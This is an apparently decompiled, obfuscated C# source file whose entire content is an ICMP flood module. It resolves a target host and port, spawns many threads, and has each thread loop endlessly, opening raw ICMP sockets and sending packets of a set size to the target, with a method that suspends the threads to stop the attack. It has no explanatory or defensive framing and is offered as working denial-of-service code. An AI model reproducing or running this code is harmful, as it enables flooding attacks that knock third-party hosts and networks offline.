using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace ns0;

internal class Class11
{
	private class Class12
	{
		private int bvncvbncvbncvb;

		private IPEndPoint IPEo;

		private int iPSize;

		private Socket[] pSocket;

		public Class12(IPEndPoint ipendPoint_0, int int_0, int int_1)
		{
			IPEo = ipendPoint_0;
			bvncvbncvbncvb = int_0;
			iPSize = int_1;
		}

		public void method_0()
		{
			while (true)
			{
				byte[] buffer = new byte[iPSize];
				try
				{
					pSocket = new Socket[bvncvbncvbncvb];
					for (int i = 0; i < bvncvbncvbncvb; i++)
					{
						pSocket[i] = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Icmp);
						pSocket[i].Blocking = false;
						pSocket[i].SendTo(buffer, IPEo);
					}
					Thread.Sleep(100);
					for (int i = 0; i < bvncvbncvbncvb; i++)
					{
						if (pSocket[i].Connected)
						{
							pSocket[i].Disconnect(reuseSocket: false);
						}
						pSocket[i].Close();
						pSocket[i] = null;
					}
					pSocket = null;
				}
				catch
				{
					for (int i = 0; i < bvncvbncvbncvb; i++)
					{
						try
						{
							if (pSocket[i].Connected)
							{
								pSocket[i].Disconnect(reuseSocket: false);
							}
							pSocket[i].Close();
							pSocket[i] = null;
						}
						catch
						{
						}
					}
				}
			}
		}
	}

	private static ThreadStart[] tzurtzhjkutrzu;

	private static Thread[] gfhjfghjfgjgfhj;

	public static string ergtsergsrg;

	public static int zuitzuituzui;

	private static IPEndPoint erzertertz;

	public static ushort hjmbvmvbmvbnm;

	public static int nmbvmvnvbnm;

	private static Class12[] zirtzutzhjtrzu;

	public static int mbvmfgzjdfgh;

	public static void smethod_0()
	{
		try
		{
			erzertertz = new IPEndPoint(Dns.GetHostEntry(ergtsergsrg).AddressList[0], hjmbvmvbmvbnm);
		}
		catch
		{
			erzertertz = new IPEndPoint(IPAddress.Parse(ergtsergsrg), hjmbvmvbmvbnm);
		}
		gfhjfghjfgjgfhj = new Thread[mbvmfgzjdfgh];
		tzurtzhjkutrzu = new ThreadStart[mbvmfgzjdfgh];
		zirtzutzhjtrzu = new Class12[mbvmfgzjdfgh];
		for (int i = 0; i < mbvmfgzjdfgh; i++)
		{
			zirtzutzhjtrzu[i] = new Class12(erzertertz, zuitzuituzui, nmbvmvnvbnm);
			tzurtzhjkutrzu[i] = zirtzutzhjtrzu[i].method_0;
			gfhjfghjfgjgfhj[i] = new Thread(tzurtzhjkutrzu[i]);
			gfhjfghjfgjgfhj[i].Start();
		}
	}

	public static void smethod_1()
	{
		for (int i = 0; i < mbvmfgzjdfgh; i++)
		{
			try
			{
				gfhjfghjfgjgfhj[i].Suspend();
			}
			catch
			{
			}
		}
	}
}
